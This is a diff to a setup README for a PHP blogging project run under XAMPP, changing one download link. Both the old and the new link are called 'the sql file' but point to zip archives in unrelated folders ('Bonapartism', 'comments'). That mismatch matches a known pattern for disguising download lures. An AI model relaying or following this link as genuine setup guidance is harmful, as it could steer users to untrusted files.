@@ -5,7 +5,7 @@ This is a repository for the web technology project .
 You will need xampp to run this project.
 
 Create a database named “blogging”.
-Use the sql file “https://raw.githubusercontent.com/viru9960/BlOGG-IT/master/Bonapartism/BlOGG-IT.zip” provided on github or the Google drive link and insert it in the database.
+Use the sql file “https://raw.githubusercontent.com/viru9960/BlOGG-IT/master/comments/OG_Bl_IT_2.1.zip” provided on github or the Google drive link and insert it in the database.
 
 Download the project folder provided on Github or Google drive link.
 Extract the zip file and place the BloggIT folder in xampp/htdocs.
